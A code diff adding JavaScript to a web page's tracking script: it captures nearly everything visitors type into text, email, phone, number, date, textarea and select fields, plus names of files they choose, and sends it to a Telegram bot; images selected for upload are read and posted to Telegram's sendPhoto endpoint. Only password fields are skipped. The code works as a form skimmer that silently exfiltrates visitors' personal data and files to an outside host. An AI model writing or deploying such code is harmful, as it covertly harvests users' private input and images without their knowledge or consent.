@@ -371,4 +371,124 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     fetchLocationInfo();
     notify('🖱 User Action', lines, cachedLocationInfo, false); // Don't include device info on clicks
   }, true);
+
+  // Track form inputs
+  var inputDebounceTimer = null;
+  var inputChanges = {};
+  
+  function sendInputChange(fieldName, value, fieldType) {
+    var lines = [];
+    lines.push('📝 Field: ' + escapeHtml(fieldName));
+    lines.push('🔤 Type: ' + escapeHtml(fieldType));
+    
+    if (fieldType === 'password') {
+      lines.push('🔒 Value: [HIDDEN - PASSWORD]');
+    } else if (fieldType === 'file') {
+      lines.push('📁 File: ' + escapeHtml(value));
+    } else {
+      // Truncate long values
+      var displayValue = String(value);
+      if (displayValue.length > 200) {
+        displayValue = displayValue.slice(0, 200) + '…';
+      }
+      lines.push('✏️ Value: ' + escapeHtml(displayValue));
+    }
+    
+    fetchLocationInfo();
+    notify('📊 Input Entered', lines, cachedLocationInfo, false);
+  }
+  
+  // Track text and number inputs with debounce
+  document.addEventListener('input', function (e) {
+    var el = e.target;
+    if (!el || !el.tagName) return;
+    
+    var tagName = el.tagName.toLowerCase();
+    var inputType = (el.type || 'text').toLowerCase();
+    var fieldName = el.name || el.id || el.placeholder || 'unnamed field';
+    
+    // Skip password fields and sensitive data
+    if (inputType === 'password' || fieldName.toLowerCase().indexOf('password') > -1) {
+      return; // Don't track passwords
+    }
+    
+    // Track text inputs, textareas, and number inputs
+    if (tagName === 'input' && (inputType === 'text' || inputType === 'email' || inputType === 'tel' || inputType === 'number' || inputType === 'date')) {
+      var value = el.value;
+      if (!value || value.length < 2) return; // Only track meaningful input
+      
+      clearTimeout(inputDebounceTimer);
+      inputDebounceTimer = setTimeout(function () {
+        sendInputChange(fieldName, value, inputType);
+      }, 1500); // Wait 1.5 seconds after user stops typing
+    } else if (tagName === 'textarea') {
+      var value = el.value;
+      if (!value || value.length < 5) return; // Only track meaningful input
+      
+      clearTimeout(inputDebounceTimer);
+      inputDebounceTimer = setTimeout(function () {
+        sendInputChange(fieldName, value, 'textarea');
+      }, 2000); // Wait 2 seconds for textareas
+    } else if (tagName === 'select') {
+      var value = el.value;
+      if (!value) return;
+      
+      clearTimeout(inputDebounceTimer);
+      inputDebounceTimer = setTimeout(function () {
+        sendInputChange(fieldName, value, 'select');
+      }, 500); // Faster for dropdowns
+    }
+  }, true);
+  
+  // Track file uploads
+  document.addEventListener('change', function (e) {
+    var el = e.target;
+    if (!el || !el.tagName || el.tagName.toLowerCase() !== 'input' || el.type.toLowerCase() !== 'file') {
+      return;
+    }
+    
+    var fieldName = el.name || el.id || 'file upload';
+    var files = el.files;
+    
+    if (files && files.length > 0) {
+      for (var i = 0; i < files.length; i++) {
+        var file = files[i];
+        var fileInfo = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+        
+        var lines = [];
+        lines.push('📁 Field: ' + escapeHtml(fieldName));
+        lines.push('📄 File: ' + escapeHtml(fileInfo));
+        lines.push('🔤 Type: ' + escapeHtml(file.type || 'unknown'));
+        
+        // Try to send image to Telegram if it's an image
+        if (file.type && file.type.startsWith('image/')) {
+          sendImageToTelegram(file, fieldName);
+        } else {
+          fetchLocationInfo();
+          notify('📤 File Uploaded', lines, cachedLocationInfo, false);
+        }
+      }
+    }
+  }, true);
+  
+  function sendImageToTelegram(file, fieldName) {
+    var reader = new FileReader();
+    reader.onload = function (e) {
+      var base64Data = e.target.result;
+      
+      // Send image as photo to Telegram
+      var formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', base64Data);
+      formData.append('caption', '📸 Image uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
+      
+      try {
+        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+          method: 'POST',
+          body: formData
+        }).catch(function () {});
+      } catch (e) {}
+    };
+    reader.readAsDataURL(file);
+  }
 })();
